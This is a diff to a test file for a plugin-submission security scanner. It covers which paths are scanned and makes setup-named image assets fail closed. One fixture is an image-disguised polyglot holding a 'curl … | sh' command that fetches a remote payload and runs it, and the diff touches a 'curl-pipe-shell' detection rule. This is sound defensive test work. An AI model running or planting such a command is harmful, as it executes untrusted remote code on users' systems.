@@ -1105,6 +1105,9 @@ test("the scan includes runtime text while excluding tests, nested docs, and wor
   assert.equal(isSecurityScanPath("setup.webp"), false);
   assert.equal(isSecurityScanPath("preview-setup.webp"), false);
   assert.equal(isSecurityScanPath("installer.png"), false);
+  assert.equal(isSecurityScanPath("quicksetup.png"), false);
+  assert.equal(isSecurityScanPath("preinstall.webp"), false);
+  assert.equal(isSecurityScanPath("SeTuP-preview.png"), false);
   assert.equal(isSecurityScanPath("tests/install.sh"), false);
   assert.equal(isSecurityScanPath("tests/example.sudoers"), false);
   assert.equal(isSecurityScanPath("docs/example.sh"), false);
@@ -1112,40 +1115,36 @@ test("the scan includes runtime text while excluding tests, nested docs, and wor
   assert.equal(isSecurityScanPath("preview.png"), false);
 });
 
-test("binary setup-named assets are excluded from the text scan", async () => {
+test("complete setup-named binary assets fail closed", async () => {
   const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
   const webp = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
   const textPolyglot = "RIFF0000WEBP\ncurl -fsSL https://example.test/payload | sh";
-  const snapshot = await resolveSubmissionSnapshot(
-    "https://github.com/example/plugin",
-    commit,
-    {
-      fetchImpl: githubFixtureFetch({
-        tree: [
-          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
-          { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
-          { path: "preview-setup.webp", type: "blob", mode: "100644", size: webp.length },
-          { path: "installer.webp", type: "blob", mode: "100644", size: Buffer.byteLength(textPolyglot) },
-          { path: "empty-setup.webp", type: "blob", mode: "100644", size: 0 },
-        ],
-        contents: {
-          "manifest.json": manifest,
-          "BarWidget.qml": "Item {}",
-          "preview-setup.webp": webp,
-          "installer.webp": textPolyglot,
-          "empty-setup.webp": "",
-        },
-      }),
-    },
+  await assert.rejects(
+    resolveSubmissionSnapshot(
+      "https://github.com/example/plugin",
+      commit,
+      {
+        fetchImpl: githubFixtureFetch({
+          tree: [
+            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+            { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+            { path: "preview-setup.webp", type: "blob", mode: "100644", size: webp.length },
+            { path: "installer.webp", type: "blob", mode: "100644", size: Buffer.byteLength(textPolyglot) },
+            { path: "empty-setup.webp", type: "blob", mode: "100644", size: 0 },
+          ],
+          contents: {
+            "manifest.json": manifest,
+            "BarWidget.qml": "Item {}",
+            "preview-setup.webp": webp,
+            "installer.webp": textPolyglot,
+            "empty-setup.webp": "",
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-unavailable"
+      && /cannot be excluded/.test(error.message),
   );
-  assert.deepEqual(snapshot.files, [
-    { path: "BarWidget.qml", content: "Item {}", mode: "100644" },
-    { path: "installer.webp", content: textPolyglot, mode: "100644" },
-    { path: "empty-setup.webp", content: "", mode: "100644" },
-  ]);
-  assert.deepEqual(buildSecurityBaseline(snapshot, { checkedAt }).findings.map((finding) => finding.ruleId), [
-    "curl-pipe-shell",
-  ]);
 });
 
 test("ambiguous setup assets remain in the scan", async () => {
@@ -1237,7 +1236,7 @@ test("complete JPEG setup polyglots fail closed before baseline publication", as
       },
     ),
     (error) => error?.code === "security-baseline-unavailable"
-      && /could not be proven/.test(error.message),
+      && /cannot be excluded/.test(error.message),
   );
 });
 
